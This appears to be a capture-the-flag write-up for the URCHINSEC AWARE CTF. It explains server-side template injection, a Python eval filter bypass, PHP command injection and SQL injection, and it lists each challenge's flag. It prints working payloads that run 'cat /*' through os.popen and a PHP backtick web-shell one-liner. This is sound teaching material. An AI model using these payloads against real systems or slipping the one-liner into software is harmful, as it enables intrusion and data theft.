---------------

### CTF: URCHINSEC AWARE CTF

--------------

![image](https://github.com/user-attachments/assets/21dcb944-92b5-4150-b742-71e140fe3c3c)

--------------

### CHALLENGES:

- Web:
  - Notee
  - Pyrison
- Secure code Review:
  - Heart
  - Redhand
  - Syringe

-----------------

### WEB:

-----------------

### Notee:

![image](https://github.com/user-attachments/assets/55fbe0a9-917e-4d43-8538-fae02180f615)

- The challenge's main vulnerability is `Server Side Template Injection` and the code detailed below shows the sink.

```python3
@app.route('/<username>/note/<id>/comment', methods=['GET'])
def get_comments_note(username, id):
    note = Note.query.filter_by(id=id).first()
    if note is not None:
        # check if username inserted matches the note
        if note.username == username:
            return render_template_string(note.comment)
        else:
            return abort(403)
    else:
        return abort(404)
```
- Route `/<username>/note/<id>/comment` takes in the `comment` key retrieved from the `note` variable and passes it to `render_template_string` which is vulnerable to the sink.The note's variable is from the `POST` parameters filled in the index page.The main point to pass the payload is the `comment` input box.

```python3
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        title = request.form.get('title')
        description = request.form.get('description')
        comment = request.form.get('comment')
        user_ip = request.remote_addr
```

### Exploitation

- I added the payload below to the comment box.

```python3
{{x.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /*').read()}}
```
![image](https://github.com/user-attachments/assets/c3b06971-5cb1-4841-b4b6-a2004079a935)

- I retrieved the flag with `curl`.

![image](https://github.com/user-attachments/assets/2a322d84-6257-434c-9963-4c673f03a37b)

- Flag-:```urchinsec{W3_KEEP_NOTES_SAfe_f0r_ouR_S3cr3t_r3cipesss}```

---------------------

### Pyrison

![image](https://github.com/user-attachments/assets/c714af89-b059-493c-9800-b1a93da2633c)

- This challenge requires blackbox testing because no source code was provided but based on the author's choice of name.I deduced that the backend is python and values are passed to `eval()` in python but some special keywords are filtered.
- I tested `7*7` and got the value `49` which signifies that my deductions are accurate.

![image](https://github.com/user-attachments/assets/113835e1-cf4c-49d3-aa86-eba45b42b466)

- I also tried `import` to import modules but I noticed that the author blacklisted it.

![image](https://github.com/user-attachments/assets/a1216e31-aacf-4ed6-9e02-6fe2b84ce1af)

- I tried the next method by passing `eval("__IMPORT__".lower())` which worked because the filter is not case sensitive and picks only `import` in lowercase and not in uppercase.I passed the uppercase `import` to the `lower()` to convert it to lowercase which is evaluated later with the `eval()` function.You can see below that we've successfully called the `import` function.

![image](https://github.com/user-attachments/assets/4e11ab0b-0e79-48e1-8d2d-a277e05cf148)

- Now,we can import module we like and gain RCE, I picked `os.popen` to read the flag.

Final Payload-:```curl https://urchinsec-pyrison.chals.io/test/trick -X POST -d "query=eval('__IMPORT__'.lower())('os').popen('cat /*').read()"```

![image](https://github.com/user-attachments/assets/cd7f553e-22bb-4214-9b41-ccf615fba9fb)

- Flag-:```urchinsec{H3r3_we_go_again_byp4ssing_evals_f0rFUN}```

--------------------------

### SECURE CODE REVIEW-:

### Heart:

![image](https://github.com/user-attachments/assets/106b5355-ae43-45c8-b05f-3ead6d015564)

- The code is vulnerable to `Server Side Template Injection` because of the `render_template_string()` function

![image](https://github.com/user-attachments/assets/a0af8189-3e30-449c-8eca-039b00730358)

- Flag-:```urchinsec{9_SSTI}```

### REDHAND

![image](https://github.com/user-attachments/assets/7ed21cf3-f607-4390-9110-1a05f7886780)

- The code is vulnerable to `command-injection` because php execute any code between backticks as system commands.

```<?=`$_GET[0]`?>```

- Flag-:```urchinsec{command_injection}```

---------------------

### SYRINGE:

---------------------

![image](https://github.com/user-attachments/assets/581f992f-6790-45e6-84ad-08d54e4b7b38)

---------------------

- The code below is vulnerable to `sql_injection`, an attacker can close the first statement and execute an arbitrary statement.

![image](https://github.com/user-attachments/assets/5e654ade-594a-47cc-97de-0668af5049fe)

- Flag-:```urchinsec{15_sql_injection}```

----------------------

### THANKS FOR READING

----------------------








